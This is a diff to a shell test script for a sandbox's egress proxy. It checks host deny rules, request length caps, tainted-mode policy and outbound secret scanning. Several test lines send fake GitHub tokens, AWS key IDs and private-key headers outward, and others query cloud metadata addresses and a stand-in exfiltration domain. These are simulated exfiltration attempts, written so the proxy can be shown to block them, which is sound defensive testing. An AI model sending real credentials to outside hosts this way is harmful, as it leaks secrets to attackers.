@@ -53,6 +53,11 @@ check path-get-still-allowed "$(code "https://cdn.test:$U/echo")" "200"
 check secret-host-bound "$(c "https://denied-for-secret.test:$U/echo" | jq -r .auth_sha256)" "null"
 # denied host, raw IPs, metadata
 check denied-host "$(code "https://denied.test:$U/echo")" "403"
+# the warehouse (deny_hosts) is denied even though a rule admits it, including wildcard zones
+check warehouse-denied-despite-rule "$(code "https://trino.test:$U/echo")" "403"
+check warehouse-post-denied "$(code -X POST --data 'select 1' "https://trino.test:$U/v1/statement")" "403"
+check warehouse-zone-denied "$(code "https://db.warehouse.test:$U/echo")" "403"
+check warehouse-dns-denied "$("$venv/bin/python" "$here/harness.py" dns-query 127.0.0.1 "$DP" trino.test | cut -d' ' -f1)" "rcode=5"
 check raw-ip-loopback "$(code "https://127.0.0.1:$U/echo")" "403"
 check raw-ip-public "$(code "https://93.184.215.14/")" "403"
 check metadata-raw-ip "$(code "http://169.254.169.254/latest/meta-data/")" "403"
@@ -88,10 +93,31 @@ check dns-denied "$("$venv/bin/python" "$here/harness.py" dns-query 127.0.0.1 "$
 check dns-metadata-filtered "$("$venv/bin/python" "$here/harness.py" dns-query 127.0.0.1 "$DP" metadata.test)" "rcode=0 answers=-"
 check dns-aaaa-nodata "$("$venv/bin/python" "$here/harness.py" dns-query 127.0.0.1 "$DP" api.test 28)" "rcode=0 answers=-"
 check dns-aaaa-denied "$("$venv/bin/python" "$here/harness.py" dns-query 127.0.0.1 "$DP" exfil-data.evil.example 28)" "rcode=5 answers=-"
+check clean-registry "$(code "https://registry.npmjs.org:$U/echo")" "200"
+check clean-wildcard "$(code "https://x.wild.test:$U/echo")" "200"
+# request limits: listed hosts get generous caps on the target and query
+check url-cap-listed "$(code "https://api.test:$U/echo/$(head -c 8300 /dev/zero | tr '\0' a)")" "403"
+check query-cap-listed "$(code "https://api.test:$U/echo?q=$(head -c 4200 /dev/zero | tr '\0' a)")" "403"
+check under-caps-ok "$(code "https://api.test:$U/echo?q=$(head -c 3000 /dev/zero | tr '\0' a)")" "200"
+# outbound secret scanning: query, path, header and body; the node's own secret value too
+FAKE_GH="ghp_$(head -c 36 /dev/zero | tr '\0' A)"
+check secret-in-query "$(code "https://api.test:$U/echo?t=$FAKE_GH")" "403"
+check secret-in-path "$(code "https://cdn.test:$U/x/$FAKE_GH")" "403"
+check secret-in-header "$(code -H "X-Note: AKIAABCDEFGHIJKLMNOP" "https://cdn.test:$U/echo")" "403"
+check secret-node-value "$(code "https://cdn.test:$U/echo?v=$(cat "$work/secrets/testsvc.token")")" "403"
+check secret-in-body "$(code -X POST --data-binary $'-----BEGIN OPENSSH PRIVATE KEY-----\nabc' "https://cdn.test:$U/octo/repo.git/git-upload-pack")" "403"
+check clean-body-passes "$(code -X POST --data x "https://cdn.test:$U/octo/repo.git/git-upload-pack")" "501"
+check secret-reason-audited "$(jq -r 'select(.reason=="secret-detected") | .secret_rule' "$work/audit.jsonl" | sort -u | tr '\n' ' ')" "aws-access-key github-token node-secret private-key "
+check secret-not-in-audit "$(grep -c "$FAKE_GH\|AKIAABCDEFGHIJKLMNOP" "$work/audit.jsonl" || true)" "0"
+# open-web tier is off by default: an unlisted host stays denied
+check open-web-off "$(code "https://open.test:$U/echo")" "403"
 # taint narrows egress to allowWhenTainted hosts; the trusted side rewrites the policy
 "$venv/bin/python" "$here/harness.py" policy --dir "$work" --key "$KEY" --tainted
 check tainted-blocks-api "$(code "https://api.test:$U/echo")" "403"
 check tainted-keeps-cdn "$(code "https://cdn.test:$U/echo")" "200"
+# allowWhenTainted is ignored on package registries / code hosts and on wildcard rules
+check tainted-blocks-registry-despite-flag "$(code "https://registry.npmjs.org:$U/echo")" "403"
+check tainted-blocks-wildcard-despite-flag "$(code "https://x.wild.test:$U/echo")" "403"
 # a source with no mapping gets nothing (the policy belongs to the sandbox's interface/IP)
 rm -f "$work/sources/127.0.0.1"
 check unknown-source "$(code "https://cdn.test:$U/echo")" "403"
@@ -103,6 +129,7 @@ check audit-no-bearer "$(grep -ci 'bearer' "$A" || true)" "0"
 check audit-no-query "$(grep -c 'secret-query-value' "$A" || true)" "0"
 check audit-no-body "$(grep -c 'hello-ws\|auth_sha256\|RAW-TCP-BANNER' "$A" || true)" "0"
 check audit-injection-named "$(jq -r 'select(.injected=="testsvc") | .host' "$A" | sort -u | tr '\n' ' ')" "api.test "
+check warehouse-reason-audited "$(jq -r 'select(.host=="trino.test" and .decision=="deny") | .reason' "$A" | sort -u | tr '\n' ' ')" "denied-host "
 echo "reasons seen: $(jq -r 'select(.decision=="deny") | .reason' "$A" | sort | uniq -c | awk '{printf "%s=%s ", $2, $1}')"
 echo "=== proxy-test: $passes passed, $fails failed"
 if [ "$fails" = 0 ]; then echo "RESULT PASS"; else echo "RESULT FAIL"; exit 1; fi
